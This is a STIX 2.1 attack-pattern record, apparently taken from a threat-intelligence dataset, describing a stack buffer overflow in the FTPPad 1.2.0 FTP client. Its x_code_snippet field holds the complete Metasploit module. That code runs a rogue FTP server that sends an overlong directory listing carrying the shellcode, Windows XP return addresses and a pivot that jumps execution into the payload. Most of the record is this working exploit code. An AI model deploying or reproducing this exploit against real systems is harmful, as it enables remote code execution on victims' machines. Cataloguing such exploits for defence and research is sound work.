{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a6ccc1ab-50cf-46dc-9cc8-3b6c9dc0924f",
    "created": "2024-08-14T16:51:16.521447Z",
    "modified": "2024-08-14T16:51:16.521451Z",
    "name": "FTPPad 1.2.0 Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow FTPPad 1.2.0 ftp client. The overflow is triggered when the client connects to a FTP server which sends an overly long directory and filename in response to a LIST command.  This will cause an access violation, and will eventually overwrite the saved extended instruction pointer.  Payload can be found at EDX+5c and ESI+5c, so a little pivot/ sniper was needed to make this one work. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/ftppad_list_reply.rb",
            "external_id": "ftppad_list_reply.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Exploit::Remote::FtpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'FTPPad 1.2.0 Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow FTPPad 1.2.0 ftp client. The overflow is\n        triggered when the client connects to a FTP server which sends an overly long directory\n        and filename in response to a LIST command.\n\n        This will cause an access violation, and will eventually overwrite the saved extended\n        instruction pointer.  Payload can be found at EDX+5c and ESI+5c, so a little pivot/\n        sniper was needed to make this one work.\n      },\n      'Author' \t =>\n        [\n          'corelanc0d3r'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '68714' ],\n          [ 'URL', 'http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 3000,\n          'BadChars' => \"\\x00\\x0a\\x2f\\x5c\\xff\\x0c\\x0d\\x08\\x09\",\n          'DisableNops' => true,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          #shlwapi sniper + pivot :  MOV DWORD PTR DS:[EDX],EAX + CALL ESI\n          [ 'XP SP3 Professional, English - shlwapi 6.00.2900.5912', { 'Ret' => 0x77FA6556 } ],\n          [ 'XP SP3 Professional, German - shlwapi 6.00.2900.5912' , { 'Ret' => 0x77f86556 } ],\n          [ 'XP SP3 Professional, English - shlwapi 6.00.2900.5512', { 'Ret' => 0x77FA6526 } ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-10-12',\n      'DefaultTarget'  => 0))\n\n  end\n\n  def setup\n    super\n  end\n\n  def on_client_unknown_command(c,cmd,arg)\n    c.put(\"200 OK\\r\\n\")\n  end\n\n  def on_client_command_list(c,arg)\n    conn = establish_data_connection(c)\n    if(not conn)\n      c.put(\"425 Can't build data connection\\r\\n\")\n      return\n    end\n    print_status(\" - Data connection set up\")\n    code = 150\n    c.put(\"#{code} Here comes the directory listing.\\r\\n\")\n    code = 226\n    c.put(\"#{code} Directory send ok.\\r\\n\")\n    totalsize = 13000\n    foldername = \"A\" * 24 + payload.encoded + (\"A\" * (3318-payload.encoded.length))\n    #EDX+5c and ESI+5c point at shellcode\n    #we control EAX and EIP\n    #use value in EAX to write to EDX (to make a jump forward, about 5c bytes)\n    #and then jump to ESI (which will then execute the jump forward, to payload)\n    foldername << [target.ret].pack('V')  # MOV DWORD PTR DS:[EDX],EAX # ... # CALL ESI\n    foldername << \"\\x41\\x41\\x75\\x5B\"  # EAX -> 75 5B = JNZ SHORT -> shellcode\n    foldername << \" \" * (totalsize - foldername.length)\n    print_status(\" - Sending directory list via data connection\")\n    dirlist = \"drwxrwxrwx    1 100      0         11111 Jun 11 21:10 #{foldername}\\r\\n\"\n    conn.put(dirlist + dirlist + dirlist + dirlist)\n    conn.close\n    return\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-10-12",
    "x_mitre_platforms": [
        "win'"
    ]
}